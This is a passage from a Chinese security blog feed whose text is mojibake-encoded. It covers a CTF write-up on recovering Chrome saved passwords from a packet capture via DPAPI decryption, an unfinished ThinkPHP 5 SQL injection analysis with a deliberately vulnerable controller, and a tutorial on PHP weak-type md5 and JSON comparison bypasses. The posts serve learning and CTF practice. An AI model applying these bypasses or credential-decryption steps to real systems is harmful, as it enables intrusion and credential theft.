class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘ç°ç¬¬äºŒä¸ªæµçš„æœ€åä¸€ä¸ªæµé‡</p>
<p><img src="/2019/11/wireshark/image-20191111115823331.png" alt="image-20191111115823331"></p>
<p><img src="/2019/11/wireshark/image-20191111115909128.png" alt="image-20191111115909128"></p>
<p><img src="/2019/11/wireshark/image-20191111120005244.png" alt="image-20191111120005244"></p>
<p><img src="/2019/11/wireshark/image-20191107234940949.png" alt="image-20191107234940949"></p>
<p>å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä½†ç›®å‰ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p>
<p>åº”è¯¥åœ¨æµé‡åŒ…ä¸­è¿˜æœ‰æˆ‘ä»¬æ²¡æœ‰å‘ç°çš„ä¸œè¥¿</p>
<p>ä¸€ã€å¯ä»¥é€šè¿‡æœç´¢å…³é”®å­—çš„16è¿›åˆ¶ï¼ŒäºŒã€å¯ä»¥é€šè¿‡æŸ¥é˜…å®Œæ•´TCPæµã€‚</p>
<p>1.flagçš„16è¿›åˆ¶ä¸º <code>666c6167</code></p>
<p><img src="/2019/11/wireshark/image-20191107235545698.png" alt="image-20191107235545698"></p>
<p>ç¬¬521ä¸ªåŒ…</p>
<p>2.è°ƒæ•´æµï¼Œå¤§è‡´æµè§ˆæŠ¥æ–‡ã€‚</p>
<p>åœ¨ç¬¬8ä¸ªæµ ï¼Œå‘ç°äº†ä¸ä¸€æ ·çš„ä¸œè¥¿</p>
<p><img src="/2019/11/wireshark/image-20191107235710539.png" alt="image-20191107235710539"></p>
<p>é€šè¿‡å¯¼å‡ºå¯¹è±¡ï¼ŒæŠŠè¿™ä¸ªSQLiteæ–‡ä»¶å¯¼å‡º</p>
<p>ç„¶åè¿™é¢˜ä¸»è¦æ˜¯è§£å¯†<code>Chrome</code>æµè§ˆå™¨çš„ä¿å­˜å¯†ç çš„<code>Login Data</code>æ•°æ®åº“ï¼ˆå°±æ˜¯ä¸ªSQLIte3æ•°æ®åº“ï¼‰ï¼Œ</p>
<p>å¯ä»¥é€šè¿‡ç¦»çº¿çš„æ–¹å¼å¯¼å‡ºå¯†ç ã€‚éœ€è¦ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç è§£å¯†master key file è·å¾—master keyã€‚å†ç”¨master keyè§£å¯†DPAPI blob ã€‚<br> è§£è¿™é¢˜ä¸»è¦éœ€è¦æ˜æ–‡å¯†ç ã€<code>blob</code>ã€<code>master key</code>ã€‚ä¸»è¦æ˜¯322ï¼Œ524ï¼Œ654å·æ•°æ®åŒ…ï¼š</p>
<p>ä½¿ç”¨DB Browser for SQLiteæ‰“å¼€SQLiteæ–‡ä»¶</p>
<p><img src="/2019/11/wireshark/image-20191109230229511.png" alt="image-20191109230229511"></p>
<p>å¯¼å‡ºåŠ å¯†åçš„blob</p>
<p>åœ¨æœ€åä¸€ä¸ªæµä¸­(11)ï¼Œå‘ç°è¿”å›çš„å­—ç¬¦ä¸²å’Œä¹‹å‰çš„ä¸ä¸€æ ·ï¼Œ</p>
<p>è§£å¯†POSTåŒ…</p>
<p><img src="/2019/11/wireshark/image-20191109233659468.png" alt="image-20191109233659468"></p>
<p>å¾—åˆ°æ–‡ä»¶è·¯å¾„</p>
<p>è¿”å›çš„å¯†æ–‡å°±æ˜¯<code>master key</code></p>
<p><img src="/2019/11/wireshark/image-20191109231824174.png" alt="image-20191109231824174"></p>
<p>å¤åˆ¶åˆ°æ–‡ä»¶æˆ–è€…å¯¼å‡ºå¯¹è±¡</p>
<p>æœ€ååˆ©ç”¨ windows password recoveryæ¥è§£å¯† </p>
<p>(æ²¡æœ‰ windows password recoveryæ‰€ä»¥å›¾æ˜¯ç›—çš„<a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">yyqx</a>å¤§ä½¬çš„)</p>
<p>  é€‰æ‹©Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob <img src="/2019/11/wireshark/2019110711452061.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> <img src="/2019/11/wireshark/20191107114526761.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> <img src="/2019/11/wireshark/20191107114541741.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> SIDå°±æ˜¯ä¹‹å‰è·¯å¾„ä¸­çš„S-1-5-21-2127750816-4215895028-2373289296-1001<br> passwordå°±æ˜¯p@ssw0rd<br> ç„¶åè§£å¯† </p>
<p> <img src="/2019/11/wireshark/20191107114557647.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> <img src="/2019/11/wireshark/20191107114605559.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p><a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://cloud.tencent.com/developer/news/90236" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>å·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp5-SQLæ³¨å…¥æ¼æ´åˆ†æ</title>
    <url>/2021/03/%C2%96Thinkphp5-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="å®¡è®¡ç¯å¢ƒ"><a href="#å®¡è®¡ç¯å¢ƒ" class="headerlink" title="å®¡è®¡ç¯å¢ƒ"></a>å®¡è®¡ç¯å¢ƒ</h3><p>ç¯å¢ƒæ­å»ºå¡äº†æŒºä¹…çš„ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><ul>
<li><p>å¤šç‰ˆæœ¬çš„php</p>
<p>å¦‚æœæ˜¯Ubuntuï¼Œå‚è€ƒä»¥ä¸‹ä»£ç </p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //æ·»åŠ ä»“åº“æº</span><br><span class="line">sudo apt-get update						  //æ›´æ–°æº</span><br><span class="line">sudo apt-get install php5.6				  //å®‰è£…å…¶ä»–ç‰ˆæœ¬php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //å®‰è£…å¿…é¡»çš„æ’ä»¶</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯kaliï¼Œå‚è€ƒä¸€ä¸‹ä»£ç </p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure>
</li>
<li><p>composer</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"copy('https://install.phpcomposer.com/installer', 'composer-setup.php');"</span></span><br><span class="line">php composer-setup.php</span><br><span class="line">mv composer.phar <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>composer</span><br><span class="line"><span class="regexp">//</span>è®°å¾—åŠ ç¯å¢ƒå˜é‡</span><br><span class="line"><span class="regexp">//</span>æ¢æº</span><br><span class="line">composer config -g repo.packagist composer https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/composer/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å®‰è£…tp5æºç </p>
<p>è¿™é‡Œä»¥thinkphp v5.0.15ä¸ºä¾‹</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">cd </span>/<span class="string">var/</span><span class="string">www/</span></span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">topthink/</span><span class="string">think=</span>5.0.<span class="string">15 </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">cd </span><span class="string">tp5015</span></span><br><span class="line"><span class="string">vim </span><span class="string">composer.</span><span class="string">json </span>//å°†<span class="string">"topthink/framework"</span>:<span class="string">"5.0.*"</span> &gt;&gt;<span class="string">"topthink/framework"</span>:<span class="string">"5.0.15"</span></span><br><span class="line"><span class="string">composer </span><span class="string">update </span>  //å¯èƒ½ä¼šæŠ¥<span class="string">phpæ’</span>ä»¶ç¼ºå¤±ï¼Œç¼ºå•¥è£…å•¥ã€‚</span><br><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="string">topthink/</span><span class="string">framework=</span>5.0.<span class="string">15 </span><span class="string">thinkphp </span>//è¿™ä¸ª<span class="string">"thinkphp"</span>åå­—ä¸èƒ½æ”¹,å¯èƒ½ä¼šæŠ¥ä¾èµ–é”™è¯¯ï¼ŒæŒ‰ç…§æç¤ºä¿®æ”¹<span class="string">thinkphp/</span><span class="string">composer.</span><span class="string">json</span></span><br><span class="line"><span class="string">cd </span><span class="string">thinkphp</span></span><br><span class="line"><span class="string">composer </span><span class="string">update</span></span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤æºç å…¨éƒ¨ä¸‹è½½ä¸‹æ¥äº†ã€‚</p>
</li>
<li><p>Apache</p>
<p>é¦–å…ˆé€‰æ‹©åˆé€‚çš„phpç‰ˆæœ¬(&gt;5.4),æˆ‘è¿™é‡Œå› ä¸ºä¾èµ–é—®é¢˜æ‰€ä»¥é€‰æ‹©7.0</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a2dismod php5<span class="number">.6</span>  <span class="comment">//å…³é—­php5.6</span></span><br><span class="line">a2enmod php7<span class="number">.0</span>   <span class="comment">//å¼€å¯php7.0</span></span><br><span class="line">systemctl restart apache2  <span class="comment">//é‡å¯ç”Ÿæ•ˆ</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºè™šæ‹Ÿç›®å½•  <code>/etc/apache2/sites-available/000-default.conf</code></p>
<p><img src="/2021/03/Â–Thinkphp5-SQLæ³¨å…¥æ¼æ´åˆ†æ/image-20210320163405433.png" alt="image-20210320163405433"></p>
<p>å¢åŠ ç›‘å¬ç«¯å£ <code>/etc/apache2/ports.conf</code>  </p>
<p><img src="/2021/03/Â–Thinkphp5-SQLæ³¨å…¥æ¼æ´åˆ†æ/image-20210320163814936.png" alt="image-20210320163814936"></p>
<p>åˆ›å»ºæ—¥å¿—ç›®å½•(æ²¡æœ‰ä¼šå¯¼è‡´apacheæœåŠ¡é‡å¯å¤±è´¥)</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /<span class="built_in">var</span>/<span class="built_in">log</span>/apache2/tp5015</span><br><span class="line">systemctl <span class="built_in">restart</span> apache2</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´çš„ç¯å¢ƒå°±æ˜¯è¿™æ ·æ­å»ºçš„ã€‚é‡åˆ°ç‰¹æ®Šæƒ…å†µå°±ä¸¾ä¸€åä¸‰å§ - -!</p>
<p>åœ¨è¿›è¡Œæ¼æ´åˆ†æå‰æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸‹tpçš„è·¯ç”±æœ‰ä¸¤ç§æ¨¡å¼</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://serverName/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/</span>[<span class="string">å‚æ•°å/å‚æ•°å€¼...</span>]</span><br><span class="line">å¦‚æœä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å…¼å®¹æ¨¡å¼è®¿é—®å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="link">http://serverName/index.php?s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/</span>[<span class="string">å‚æ•°å/å‚æ•°å€¼...</span>]</span><br></pre></td></tr></table></figure>

</li>
</ul><a id="more"></a>

<h3 id="SQLæ³¨å…¥1"><a href="#SQLæ³¨å…¥1" class="headerlink" title="SQLæ³¨å…¥1"></a>SQLæ³¨å…¥1</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>æ¼æ´å­˜åœ¨äº <strong>Builder</strong> ç±»çš„ <strong>parseData</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚æ¼æ´å½±å“ç‰ˆæœ¬ï¼š <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> ã€ <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong> ã€‚</p>
<p>å°† <strong>application/index/controller/Index.php</strong> æ–‡ä»¶ä»£ç è®¾ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span></span><br><span class="line"><span class="php">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ <strong>application/database.php</strong> æ–‡ä»¶ä¸­é…ç½®æ•°æ®åº“ç›¸å…³ä¿¡æ¯ï¼Œå¹¶å¼€å¯ <strong>application/config.php</strong> ä¸­çš„ <strong>app_debug</strong> å’Œ <strong>app_trace</strong> ã€‚åˆ›å»ºæ•°æ®åº“ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> tp5015demo;</span><br><span class="line"><span class="keyword">use</span> tp5015demo;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span>(</span><br><span class="line">true<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">trueusername <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li>æ¼æ´åˆ©ç”¨</li>
</ul>
<h3 id="SQLæ³¨å…¥2"><a href="#SQLæ³¨å…¥2" class="headerlink" title="SQLæ³¨å…¥2"></a>SQLæ³¨å…¥2</h3><h3 id="SQLæ³¨å…¥3"><a href="#SQLæ³¨å…¥3" class="headerlink" title="SQLæ³¨å…¥3"></a>SQLæ³¨å…¥3</h3><h3 id="SQLæ³¨å…¥4"><a href="#SQLæ³¨å…¥4" class="headerlink" title="SQLæ³¨å…¥4"></a>SQLæ³¨å…¥4</h3><h3 id="SQLæ³¨å…¥5"><a href="#SQLæ³¨å…¥5" class="headerlink" title="SQLæ³¨å…¥5"></a>SQLæ³¨å…¥5</h3><h3 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h3><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>thinkphp</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>phpå¼±ç±»å‹</title>
    <url>/2019/11/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="å¼±ç±»å‹ä¸å¼ºç±»å‹"><a href="#å¼±ç±»å‹ä¸å¼ºç±»å‹" class="headerlink" title="å¼±ç±»å‹ä¸å¼ºç±»å‹"></a>å¼±ç±»å‹ä¸å¼ºç±»å‹</h2><p>é€šå¸¸è¯­è¨€æœ‰å¼ºç±»å‹å’Œå¼±ç±»å‹ä¸¤ç§ï¼Œå¼ºç±»å‹æŒ‡çš„æ˜¯å¼ºåˆ¶æ•°æ®ç±»å‹çš„è¯­è¨€ï¼Œå°±æ˜¯è¯´ï¼Œä¸€ä¸ªå˜é‡ä¸€æ—¦è¢«å®šä¹‰äº†æŸä¸ªç±»å‹ï¼Œå¦‚æœä¸ç»è¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè¿™ä¸ªå˜é‡å°±ä¸€ç›´æ˜¯è¿™ä¸ªç±»å‹ï¼Œåœ¨å˜é‡ä½¿ç”¨ä¹‹å‰å¿…é¡»å£°æ˜å˜é‡çš„ç±»å‹å’Œåç§°ï¼Œä¸”ä¸ç»å¼ºåˆ¶è½¬æ¢ä¸å…è®¸ä¸¤ç§ä¸åŒç±»å‹çš„å˜é‡äº’ç›¸æ“ä½œã€‚è€Œå¼±ç±»å‹è¯­è¨€ï¼Œä¸ä¼šæ£€æŸ¥å˜é‡ç±»å‹ï¼Œå¯ä»¥éšæ—¶çš„è½¬æ¢å˜é‡ç±»å‹ã€‚</p><a id="more"></a>
<p>åœ¨phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$x=<span class="number">1</span>;</span><br><span class="line">$x=<span class="string">"string"</span>;<span class="comment">//éšæ„è½¬æ¢å˜é‡ç±»å‹</span></span><br></pre></td></tr></table></figure>

<p>ä½†åœ¨Cè¯­è¨€ä¸­ä»»ä½•å˜é‡éƒ½è¦å…ˆå®šä¹‰å˜é‡ç±»å‹ï¼Œå†è¿›è¡Œèµ‹å€¼ã€‚</p>
<h2 id="æ¯”è¾ƒæ“ä½œç¬¦"><a href="#æ¯”è¾ƒæ“ä½œç¬¦" class="headerlink" title="æ¯”è¾ƒæ“ä½œç¬¦"></a>æ¯”è¾ƒæ“ä½œç¬¦</h2><p>åœ¨ç¼–ç¨‹ä¸­ç±»å‹è½¬æ¢æ˜¯ä¸å¯é¿å…çš„ä¸€ä¸ªäº‹æƒ…ï¼Œæ¯”å¦‚è¯´ç½‘ç»œç¼–ç¨‹ä¸­getæ–¹æ³•æˆ–è€…postæ–¹æ³•ä¼ å…¥ä¸€ä¸ªéœ€è¦è½¬æ¢æˆintçš„å€¼ï¼Œå†æ¯”å¦‚è¯´å˜é‡é—´è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œéœ€è¦å°†å˜é‡è¿›è¡Œè½¬æ¢ï¼Œé‰´äºphpæ˜¯è‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥ä¼šå¼•å‘å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚</p>
<p>phpæœ‰ä¸¤ç§æ¯”è¾ƒæ–¹å¼,ä¸€ç§æ˜¯â€œ= =â€ ä¸€ç§æ˜¯â€œ= = =â€è¿™ä¸¤ç§éƒ½å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªæ•°å­—çš„å¤§å°ï¼Œä½†æ˜¯æœ‰å¾ˆæ˜æ˜¾çš„åŒºåˆ«ã€‚</p>
<p>â€œ= =â€ï¼šä¼šæŠŠä¸¤ç«¯å˜é‡ç±»å‹è½¬æ¢æˆç›¸åŒçš„ï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>â€œ= = =â€ï¼šä¼šå…ˆåˆ¤æ–­ä¸¤ç«¯å˜é‡ç±»å‹æ˜¯å¦ç›¸åŒï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p>
<h2 id="ç±»å‹è½¬æ¢é—®é¢˜"><a href="#ç±»å‹è½¬æ¢é—®é¢˜" class="headerlink" title="ç±»å‹è½¬æ¢é—®é¢˜"></a>ç±»å‹è½¬æ¢é—®é¢˜</h2><p>phpä¸­æœ€å¸¸è§çš„å°±æ˜¯string è½¬intï¼Œæˆ–è€…intè½¬stringã€‚</p>
<p>ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯å¼ºåˆ¶ç±»å‹è½¬æ¢<code>(string)$x</code>æˆ–<code>strval($x)</code>,<code>(int)$x</code>æˆ–<code>intval($X)</code>,äºŒæ˜¯æ ¹æ®è¿ç®—ç¬¦è‡ªåŠ¨è½¬æ¢ã€‚</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="number">123</span>;var_dump($a); <span class="comment">//int(123)</span></span><br><span class="line">var_dump($a + <span class="string">"123"</span>); <span class="comment">//int(246)</span></span><br><span class="line">var_dump($a . <span class="string">"123"</span>); <span class="comment">//string(6) "123123"</span></span><br><span class="line">var_dump($a ==<span class="string">"123a1"</span>); <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a == <span class="string">"123e1"</span>); <span class="comment">//bool(false)</span></span><br><span class="line">var_dump($a == <span class="string">"12.3e1"</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯è¿ç®—ç¬¦åˆ™ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼å†è¿›è¡Œè®¡ç®—ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²è¿ç®—ç¬¦åˆ™è½¬æ¢æˆå­—ç¬¦ä¸²å†è®¡ç®—</p>
<p>å¦‚æœæ˜¯â€œ==â€ï¼Œåˆ™ä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p>
<h2 id="hashç»•è¿‡"><a href="#hashç»•è¿‡" class="headerlink" title="hashç»•è¿‡"></a>hashç»•è¿‡</h2><p>hash1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//å‡è®¾flagçš„å€¼ä¸å¯è§</span></span><br><span class="line">$int =<span class="number">0</span>;  <span class="comment">//ä¸º$intèµ‹å€¼ ä½¿å…¶æ»¡è¶³ifçš„æ¡ä»¶</span></span><br><span class="line"><span class="keyword">if</span>($flag !== $int &amp;&amp; md5($flag) == $int) <span class="comment">//æ³¨æ„"ï¼==" å…ˆåˆ¤æ–­ç±»å‹</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"correct\n"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"incorrect\n"</span>;</span><br></pre></td></tr></table></figure>

<p>ä¸º$intèµ‹ä½•å€¼ï¼Œæ‰èƒ½æ»¡è¶³æ¡ä»¶ï¼Ÿ</p>
<p>å…ˆçœ‹ä¸‹é¢å‡ ä¸ªä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag1 = <span class="string">"&#123;You_can't_see_me&#125;"</span>;</span><br><span class="line">$flag2 = <span class="string">"&#123;You_can't_see&#125;"</span>;</span><br><span class="line">$flag3 = <span class="string">"&#123;You_can't_se&#125;"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(md5($flag1));  <span class="comment">//string(32) "dc39eb7c561e8753d2ce41cb2e1f798b"</span></span><br><span class="line">var_dump(intval(md5($flag1)));  <span class="comment">//int(0)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag2));  <span class="comment">//string(32) "2e2e029620ec42eb68bc24e88d35b027"</span></span><br><span class="line">var_dump(intval(md5($flag2)));  <span class="comment">//int(200)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag3));  <span class="comment">//string(32) "58a39a758897868896d56904481fb4a0"</span></span><br><span class="line">var_dump(intval(md5($flag3)));  <span class="comment">//int(58)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">"1e1q"</span> == <span class="number">10</span>);  <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">"1eq"</span> == <span class="number">1</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>

<p>ä¸éš¾çœ‹å‡ºï¼Œä¸è®º$flagçš„å€¼æ˜¯ä»€ä¹ˆï¼Œmd5å‡½æ•°éƒ½ä¼šè¿”å›32ä½çš„16è¿›åˆ¶æ•°ï¼Œåˆ©ç”¨è½¬æ¢æ¼æ´ï¼Œå¯ä»¥è½»æ¾çˆ†ç ´ï¼Œä»è€Œç»•è¿‡ã€‚ä½†å¦‚æœeåé¢æœ‰æ¯”è¾ƒé•¿çš„çº¯æ•°å­—å­—ç¬¦é‚£ä¹ˆå°±åˆ«æƒ³ç€çˆ†ç ´äº†(æ¦‚ç‡è¾ƒå°)ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//å‡è®¾flagçš„å€¼ä¸å¯è§</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line">$j=intval(md5($flag));</span><br><span class="line"><span class="keyword">while</span>($i!=$j)</span><br><span class="line">&#123;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $i; <span class="comment">//721</span></span><br></pre></td></tr></table></figure>

<h2 id="jsonç»•è¿‡"><a href="#jsonç»•è¿‡" class="headerlink" title="jsonç»•è¿‡"></a>jsonç»•è¿‡</h2><p> JSON æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®æ ¼å¼ï¼Œä»–åŸºäº javascript è¯­æ³•çš„å­é›†ï¼Œå³æ•°ç»„å’Œå¯¹è±¡è¡¨ç¤ºã€‚ç”±äºä½¿ç”¨çš„æ˜¯ javascript è¯­æ³•ï¼Œå› æ­¤JSON å®šä¹‰å¯ä»¥åŒ…å«åœ¨javascript æ–‡ä»¶ä¸­ï¼Œå¯¹å…¶çš„è®¿é—®æ— éœ€é€šè¿‡åŸºäº XML çš„è¯­è¨€æ¥é¢å¤–è§£æ ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"abc"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

